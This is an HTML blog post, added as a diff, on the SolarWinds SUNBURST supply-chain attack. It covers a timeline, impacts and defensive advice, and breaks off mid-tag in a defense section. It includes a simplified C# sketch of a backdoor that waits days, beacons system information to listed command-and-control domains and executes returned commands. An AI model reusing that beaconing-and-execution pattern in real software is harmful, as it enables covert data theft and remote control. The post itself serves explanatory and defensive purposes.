@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The SolarWinds Hack: How One Software Update Compromised the US Government - CyberPulse Insights</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        .post-content { max-width: 800px; margin: 0 auto; padding: var(--space-xl) 0; }
+        .post-header { margin-bottom: var(--space-xl); }
+        .post-title { font-size: 2.5rem; margin-bottom: var(--space-md); color: var(--light); line-height: 1.2; }
+        .post-meta { display: flex; gap: var(--space-md); flex-wrap: wrap; margin-bottom: var(--space-md); }
+        .post-author { font-size: 1.1rem; color: var(--primary); display: flex; align-items: center; gap: var(--space-sm); }
+        .post-body { line-height: 1.8; }
+        
+        /* Storytelling Sections */
+        .story-section { margin-bottom: var(--space-xl); }
+        .story-title { font-size: 1.8rem; color: var(--primary); margin-bottom: var(--space-md); border-left: 4px solid var(--primary); padding-left: var(--space-md); }
+        .story-lead { font-size: 1.2rem; color: var(--light); font-weight: 500; margin-bottom: var(--space-md); line-height: 1.6; }
+        .timeline { margin: var(--space-lg) 0; }
+        .timeline-item { margin-bottom: var(--space-lg); padding-left: var(--space-lg); border-left: 2px solid var(--primary); position: relative; }
+        .timeline-date { color: var(--primary); font-weight: 600; margin-bottom: var(--space-xs); }
+        .timeline-content { color: var(--gray-light); }
+        .timeline-item:before { content: ''; position: absolute; left: -6px; top: 0; width: 10px; height: 10px; background: var(--primary); border-radius: 50%; }
+        
+        /* Technical Deep Dive */
+        .tech-section { background: rgba(14, 165, 233, 0.05); border: 1px solid rgba(14, 165, 233, 0.2); border-radius: var(--radius-lg); padding: var(--space-lg); margin: var(--space-xl) 0; }
+        .tech-title { color: var(--primary); font-size: 1.5rem; margin-bottom: var(--space-md); display: flex; align-items: center; gap: var(--space-sm); }
+        .tech-title i { color: var(--primary); }
+        .code-block { background: #1a1b26; border: 1px solid var(--gray); border-radius: var(--radius-md); padding: var(--space-md); margin: var(--space-md) 0; overflow-x: auto; font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; }
+        .code-block pre { margin: 0; color: #c0caf5; }
+        .code-comment { color: #565f89; }
+        .code-string { color: #9ece6a; }
+        .code-keyword { color: #bb9af7; }
+        
+        /* Impact & Lessons */
+        .impact-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: var(--space-md); margin: var(--space-lg) 0; }
+        .impact-card { background: rgba(255, 255, 255, 0.05); border-radius: var(--radius-md); padding: var(--space-md); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .impact-card.critical { border-left: 4px solid var(--danger); }
+        .impact-card.warning { border-left: 4px solid var(--warning); }
+        .impact-card.info { border-left: 4px solid var(--primary); }
+        .impact-card-title { color: var(--light); font-weight: 600; margin-bottom: var(--space-sm); }
+        
+        /* References */
+        .reference { background: rgba(255, 255, 255, 0.03); padding: var(--space-md); border-radius: var(--radius-md); margin: var(--space-md) 0; border-left: 3px solid var(--secondary); font-size: 0.9rem; }
+        .reference-title { color: var(--light); margin-bottom: var(--space-xs); }
+        
+        .back-button { display: inline-flex; align-items: center; gap: var(--space-sm); margin-bottom: var(--space-xl); color: var(--primary); text-decoration: none; font-weight: 500; }
+        .back-button:hover { color: var(--primary-dark); }
+        
+        @media (max-width: 768px) { 
+            .post-title { font-size: 2rem; } 
+            .post-meta { flex-direction: column; gap: var(--space-sm); } 
+            .impact-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-brand">
+                <a href="/">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>CyberPulse <strong>Insights</strong></span>
+                </a>
+            </div>
+            <button class="nav-toggle" aria-label="Toggle navigation"><i class="fas fa-bars"></i></button>
+            <div class="nav-menu">
+                <a href="/" class="nav-link"><i class="fas fa-home"></i> Home</a>
+                <a href="/#threats" class="nav-link"><i class="fas fa-fire"></i> Threats</a>
+                <a href="/#training" class="nav-link"><i class="fas fa-graduation-cap"></i> Training</a>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <div class="post-content">
+            <a href="/" class="back-button"><i class="fas fa-arrow-left"></i> Back to All Posts</a>
+            
+            <div class="post-header">
+                <div class="post-meta">
+                    <span class="post-date"><i class="far fa-calendar"></i> February 25, 2026</span>
+                    <span class="post-category critical">Critical Threat Analysis</span>
+                    <span class="read-time"><i class="far fa-clock"></i> 15 min read</span>
+                </div>
+                <h1 class="post-title">The SolarWinds Hack: How One Software Update Compromised the US Government</h1>
+                <div class="post-author"><i class="fas fa-user"></i> Michael Chen, Threat Intelligence Director</div>
+                <div class="post-tags">
+                    <span class="tag">Supply Chain Attack</span><span class="tag">SolarWinds</span><span class="tag">SUNBURST</span>
+                    <span class="tag">Nation-State</span><span class="tag">Zero Trust</span><span class="tag">Incident Response</span>
+                </div>
+            </div>
+            
+            <div class="post-body">
+                <!-- Storytelling Section -->
+                <div class="story-section">
+                    <div class="story-title">The Discovery That Shook Cybersecurity</div>
+                    <p class="story-lead">It started with a routine security alert at FireEye in December 2020. What they discovered would unravel one of the most sophisticated cyber espionage campaigns in history, affecting 18,000 organizations including the US Treasury, Commerce Department, and Fortune 500 companies.</p>
+                    
+                    <p>FireEye's own red team tools had been stolen. But this wasn't a typical breach. The attackers had been inside their network for months, moving silently, learning their defenses. As investigators dug deeper, they found something even more alarming: the breach originated not from a phishing email or weak password, but from a trusted software update.</p>
+                    
+                    <div class="timeline">
+                        <div class="timeline-item">
+                            <div class="timeline-date">March 2020</div>
+                            <div class="timeline-content">Attackers compromise SolarWinds build system, inserting malicious code into Orion platform updates</div>
+                        </div>
+                        <div class="timeline-item">
+                            <div class="timeline-date">June 2020</div>
+                            <div class="timeline-content">First malicious updates containing SUNBURST backdoor are distributed to SolarWinds customers</div>
+                        </div>
+                        <div class="timeline-item">
+                            <div class="timeline-date">December 8, 2020</div>
+                            <div class="timeline-content">FireEye discovers breach of their red team tools, begins investigation</div>
+                        </div>
+                        <div class="timeline-item">
+                            <div class="timeline-date">December 13, 2020</div>
+                            <div class="timeline-content">SolarWinds discloses compromise, 18,000 organizations potentially affected</div>
+                        </div>
+                        <div class="timeline-item">
+                            <div class="timeline-date">January 2021</div>
+                            <div class="timeline-content">US government attributes attack to Russian foreign intelligence service (SVR)</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Technical Deep Dive Section -->
+                <div class="tech-section">
+                    <div class="tech-title"><i class="fas fa-code"></i> Technical Deep Dive: How SUNBURST Worked</div>
+                    
+                    <p>The SUNBURST backdoor was a masterpiece of stealth engineering. Unlike typical malware that immediately calls home, SUNBURST waited. It observed. It mimicked legitimate SolarWinds behavior to avoid detection.</p>
+                    
+                    <h3>The Infection Chain:</h3>
+                    <ol>
+                        <li><strong>Compromised Build System:</strong> Attackers gained access to SolarWinds' software build environment</li>
+                        <li><strong>Code Injection:</strong> Malicious code inserted into SolarWinds.Orion.Core.BusinessLayer.dll</li>
+                        <li><strong>Signed Updates:</strong> Malicious updates digitally signed with SolarWinds' legitimate certificate</li>
+                        <li><strong>Dormant Period:</strong> Backdoor slept for 12-14 days after installation</li>
+                        <li><strong>Beaconing:</strong> Called home to command and control servers disguised as legitimate domains</li>
+                    </ol>
+                    
+                    <div class="code-block">
+                        <pre><span class="code-comment">// Simplified SUNBURST beaconing logic (reconstructed from analysis)</span>
+<span class="code-keyword">public class</span> <span class="code-string">SunburstBackdoor</span>
+{
+    <span class="code-keyword">private</span> <span class="code-keyword">string</span>[] c2Domains = {
+        <span class="code-string">"avsvmcloud[.]com"</span>,
+        <span class="code-string">"digitalcollege[.]org"</span>, 
+        <span class="code-string">"freescanonline[.]com"</span>,
+        <span class="code-string">"deftsecurity[.]com"</span>
+    };
+    
+    <span class="code-keyword">public void</span> Initialize()
+    {
+        <span class="code-comment">// Wait 12-14 days to avoid detection</span>
+        Thread.Sleep(TimeSpan.FromDays(<span class="code-keyword">new</span> Random().Next(12, 15)));
+        
+        <span class="code-comment">// Mimic legitimate SolarWinds traffic patterns</span>
+        <span class="code-keyword">string</span> hostname = Dns.GetHostName();
+        <span class="code-keyword">string</span> domain = GetParentDomain(hostname);
+        
+        <span class="code-keyword">foreach</span> (<span class="code-keyword">var</span> c2 <span class="code-keyword">in</span> c2Domains)
+        {
+            <span class="code-keyword">string</span> beaconUrl = $<span class="code-string">"https://{hostname}.{domain}.{c2}/api/telemetry"</span>;
+            
+            <span class="code-comment">// Encrypt and send system information</span>
+            <span class="code-keyword">var</span> systemInfo = CollectSystemInformation();
+            <span class="code-keyword">var</span> encryptedData = AesEncrypt(systemInfo);
+            
+            <span class="code-keyword">if</span> (SendBeacon(beaconUrl, encryptedData))
+            {
+                <span class="code-comment">// Receive and execute commands</span>
+                <span class="code-keyword">var</span> response = ReceiveCommands(beaconUrl);
+                ExecuteCommands(response);
+                <span class="code-keyword">break</span>;
+            }
+        }
+    }
+    
+    <span class="code-keyword">private</span> <span class="code-keyword">string</span> GetParentDomain(<span class="code-keyword">string</span> hostname)
+    {
+        <span class="code-comment">// Extract domain for realistic-looking subdomains</span>
+        <span class="code-keyword">var</span> parts = hostname.Split(<span class="code-string">'.'</span>);
+        <span class="code-keyword">return</span> parts.Length > 1 ? parts[^2] + <span class="code-string">"."</span> + parts[^1] : <span class="code-string">"local"</span>;
+    }
+}</pre>
+                    </div>
+                    
+                    <h3>Stealth Techniques Used:</h3>
+                    <div class="impact-grid">
+                        <div class="impact-card info">
+                            <div class="impact-card-title"><i class="fas fa-clock"></i> Delayed Activation</div>
+                            <p>Waited 12-14 days before beaconing to avoid sandbox detection</p>
+                        </div>
+                        <div class="impact-card info">
+                            <div class="impact-card-title"><i class="fas fa-random"></i> Domain Generation</div>
+                            <p>Created subdomains based on victim's hostname for realistic traffic</p>
+                        </div>
+                        <div class="impact-card info">
+                            <div class="impact-card-title"><i class="fas fa-user-secret"></i> Legitimate Appearance</div>
+                            <p>Mimicked SolarWinds' legitimate API calls and telemetry data</p>
+                        </div>
+                        <div class="impact-card info">
+                            <div class="impact-card-title"><i class="fas fa-certificate"></i> Code Signing</div>
+                            <p>Used SolarWinds' legitimate digital certificate for trust</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Impact Analysis -->
+                <div class="story-section">
+                    <div class="story-title">The Aftermath: What We Learned</div>
+                    
+                    <p>The SolarWinds hack wasn't just another breach. It was a wake-up call that changed how we think about software supply chain security forever.</p>
+                    
+                    <div class="impact-grid">
+                        <div class="impact-card critical">
+                            <div class="impact-card-title"><i class="fas fa-building"></i> Government Impact</div>
+                            <p><strong>US Treasury, Commerce, Energy departments</strong> compromised. Classified networks accessed. National security implications still being assessed.</p>
+                        </div>
+                        <div class="impact-card warning">
+                            <div class="impact-card-title"><i class="fas fa-industry"></i> Private Sector</div>
+                            <p><strong>Fortune 500 companies, tech giants, consulting firms</strong> affected. Microsoft, Intel, Cisco, Deloitte all confirmed breaches.</p>
+                        </div>
+                        <div class="impact-card info">
+                            <div class="impact-card-title"><i class="fas fa-dollar-sign"></i> Financial Cost</div>
+                            <p>Estimated <strong>$100M+</strong> in remediation costs for SolarWinds alone. Industry-wide impact in billions.</p>
+                        </div>
+                        <div class="impact-card info">
+                            <div class="impact-card-title"><i class="fas fa-gavel"></i> Regulatory Response</div>
+                            <p>Executive Order 14028 mandating software supply chain security. New SBOM requirements for federal contractors.</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Defense Strategies -->
+                <div class="tech-section">
+                    <div class="tech-title"><i class="fas fa-shield-alt"></i> Defense Strategies: Building Resilient Supply Chains</div>
+                    
+                    <h3>1. Software Bill of Materials (SBOM)</h3>
+                    <p>Know what's in your software. SBOMs are now mandatory for federal contractors.</p>
+                    
+                    <div class="code-block">
+                        <pre><span class="code
